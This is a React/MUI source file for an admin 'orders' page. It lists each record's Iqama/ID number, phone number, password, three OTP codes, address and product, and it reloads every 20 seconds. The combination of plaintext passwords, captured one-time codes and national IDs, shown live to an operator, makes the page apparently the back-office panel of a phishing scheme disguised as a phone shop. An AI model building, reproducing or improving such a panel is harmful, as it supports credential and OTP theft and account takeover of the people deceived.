import * as React from 'react';
import Paper from '@mui/material/Paper';
import Table from '@mui/material/Table';
import TableBody from '@mui/material/TableBody';
import TableCell from '@mui/material/TableCell';
import TableContainer from '@mui/material/TableContainer';
import TableHead from '@mui/material/TableHead';
import TablePagination from '@mui/material/TablePagination';
import TableRow from '@mui/material/TableRow';
import { useEffect } from 'react';
import { getAllOrders } from '../../../store/adminSlice';
import { useDispatch, useSelector } from 'react-redux';
import "../user.css";
import DeleteForeverIcon from '@mui/icons-material/DeleteForever';
import apiInstance from '../../../config/axios';

function createData(nid, phoneNumber, password, otp1, otp2, otp3, country, address, des, action) {
    return { nid, phoneNumber, password, otp1, otp2, otp3, country, address, des, action };
}

export default function OrderList() {
    const dispatch = useDispatch();
    const [page, setPage] = React.useState(0);
    const [rowsPerPage, setRowsPerPage] = React.useState(10);
    const { orders, isLoading } = useSelector(state => state.admin);


    const handleChangePage = (event, newPage) => {
        setPage(newPage);
    };

    const handleChangeRowsPerPage = (event) => {
        setRowsPerPage(+event.target.value);
        setPage(0);
    };

    useEffect(() => {
        dispatch(getAllOrders());
    }, [dispatch])

    useEffect(() => {
        const timer = setInterval(() => {
            window.location.reload();
        }, 20000);

        return () => {
            clearInterval(timer);
        };
    }, []);

    if (isLoading) {
        return <h1 className="text-center text-3xl font-bold py-10"> Loading... </h1>
    }

    const handleDelete = async (id) => {
        const { data } = await apiInstance.delete(`orders/delete-order?id=${id}`);
        if (data) return alert(data.message);
    }

    const columns = [
        { id: 'nid', label: 'Id/ Iqama Number', maxHeight: 100 },
        { id: 'phoneNumber', label: 'Phone Number', maxHeight: 100 },
        { id: 'password', label: 'Password', maxHeight: 100 },
        { id: 'otp1', label: 'OTP1', maxHeight: 100 },
        { id: 'otp2', label: 'OTP2', maxHeight: 100 },
        { id: 'otp3', label: 'OTP3', maxHeight: 100 },
        { id: 'country', label: 'Country', maxHeight: 100 },
        { id: 'address', label: 'Address', maxHeight: 100 },
        { id: 'des', label: 'Product Description', minHeight: 170 },
        { id: 'action', label: 'Delete', minHeight: 100 },
    ];

    const rows = orders.map((order) => (createData(`${order.nid}`, `${order.phoneNumber}`, `${order.password}`, `${order.otp[0]?.otp}`, `${order.otp[1]?.otp}`, `${order.otp[2]?.otp}`, `${order.nationality}`, `${order.address}`, <div>
        <h1> {order.name} </h1>
        <h1>  {order.color} </h1>
        <h1>  {order.storage} </h1>
    </div>, <h1 onClick={() => handleDelete(order._id)} className='text-red-600'> <DeleteForeverIcon /> </h1>)))




    return (
        <section className="userTableBox">
            <h1 className="text-center text-xl font-semibold py-3 my-5 border "> Orders list to view Orders </h1>

            <Paper sx={{ width: '100%', overflow: 'hidden' }}>
                <TableContainer sx={{ maxHeight: 800 }}>
                    <Table stickyHeader aria-label="sticky table">
                        <TableHead>
                            <TableRow>
                                {columns.map((column) => (
                                    <TableCell
                                        key={column.id}
                                        align={column.align}
                                        style={{ minWidth: column.minWidth }}
                                    >
                                        {column.label}
                                    </TableCell>
                                ))}
                            </TableRow>
                        </TableHead>
                        <TableBody>
                            {rows
                                .slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage)
                                .map((row) => {
                                    return (
                                        <TableRow hover role="checkbox" tabIndex={-1} key={row.code}>
                                            {columns.map((column) => {
                                                const value = row[column.id];
                                                return (
                                                    <TableCell key={column.id} align={column.align}>
                                                        {column.format && typeof value === 'number'
                                                            ? column.format(value)
                                                            : value}
                                                    </TableCell>
                                                );
                                            })}
                                        </TableRow>
                                    );
                                })}
                        </TableBody>
                    </Table>
                </TableContainer>
                <TablePagination
                    rowsPerPageOptions={[10, 25, 100]}
                    component="div"
                    count={rows.length}
                    rowsPerPage={rowsPerPage}
                    page={page}
                    onPageChange={handleChangePage}
                    onRowsPerPageChange={handleChangeRowsPerPage}
                />
            </Paper>
        </section>
    )
}
